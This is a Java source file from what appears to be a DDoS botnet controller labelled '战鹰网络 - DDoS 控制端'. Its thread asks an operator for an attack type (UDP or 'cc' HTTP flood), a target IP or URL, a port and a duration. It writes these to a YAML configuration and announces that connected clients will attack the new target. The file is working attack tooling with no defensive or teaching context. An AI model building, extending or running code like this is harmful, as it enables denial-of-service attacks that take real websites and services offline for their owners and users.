package com.zhanyingwl.www;

import org.yaml.snakeyaml.Yaml;

import java.io.*;
import java.util.*;

public class InputTargetThread extends Thread {
    static String targetIp;
    static String ClientIP;
    static String attackType;
    static String targetPort;
    static String targetURL;
    static String URLType;
    static String URLheader;
    static Yaml yml = Runner.yml;
    static String path = Runner.path;
    static int attackSecond;

    @Override
    public void run() { // 这里负责更新yml
        while (true) {
            try {
                Scanner scanner = new Scanner(System.in);
                System.out.println("[+] 战鹰网络 - DDoS 控制端：在下方输入任何新的内容均会更新目标配置文件。");
                System.out.println("[+] 战鹰网络 - DDoS 控制端：请输入攻击模式( udp 或 cc 区分大小写) ↓");
                attackType = scanner.nextLine();
                switch (attackType) {
                    case "udp":
                        System.out.println("[+] 战鹰网络 - DDoS 控制端：请输入目标IP ↓");
                        targetIp = scanner.nextLine();
                        break;
                    case "cc":
                        System.out.println("[+] 战鹰网络 - DDoS 控制端：请选择目标URL类型(http 或 https) ↓");
                        URLType = scanner.nextLine();
                        switch (URLType) {
                            case "http":
                                System.out.println("[+] 战鹰网络 - DDoS 控制端：请输入完整无http头的URL(例：www.baidu.com) ↓");
                                targetURL = scanner.nextLine();
                                URLheader = "http://";
                                break;
                            case "https":
                                System.out.println("[+] 战鹰网络 - DDoS 控制端：请输入完整无https头的URL(例：www.baidu.com) ↓");
                                targetURL = scanner.nextLine();
                                URLheader = "https://";
                                break;
                            default:
                                break;
                        }
                        break;
                    default:
                        break;
                }
                System.out.println("[+] 战鹰网络 - DDoS 控制端：请输入目标端口 ↓");
                targetPort = scanner.nextLine();
                System.out.println("[+] 战鹰网络 - DDoS 控制端：请输入攻击时间 ↓");
                attackSecond = Integer.parseInt(scanner.nextLine());
                System.out.println("[+] 战鹰网络 - DDoS 控制端：目标配置文件已更新。");
                System.out.println("[+] 战鹰网络 - DDoS 控制端：已连接的客户端将对新目标发起攻击！");
                System.out.println("---------------------------------------");

                Calendar calendar = Calendar.getInstance();
                calendar.add(Calendar.SECOND, attackSecond);
                Date endAt = calendar.getTime();

                Map<String, String> writeMap = new HashMap<>();
                writeMap.put("attackType", attackType);
                writeMap.put("targetIp", targetIp);
                writeMap.put("URLheader", URLheader);
                writeMap.put("targetURL", targetURL);
                writeMap.put("targetPort", targetPort);
                writeMap.put("endAt", endAt.toString());
                FileWriter fileWriter = new FileWriter(path, false);
                BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);
                yml.dump(writeMap, bufferedWriter);
                bufferedWriter.close();
                fileWriter.close();

            } catch (Exception ignored) {
            }
        }
    }
}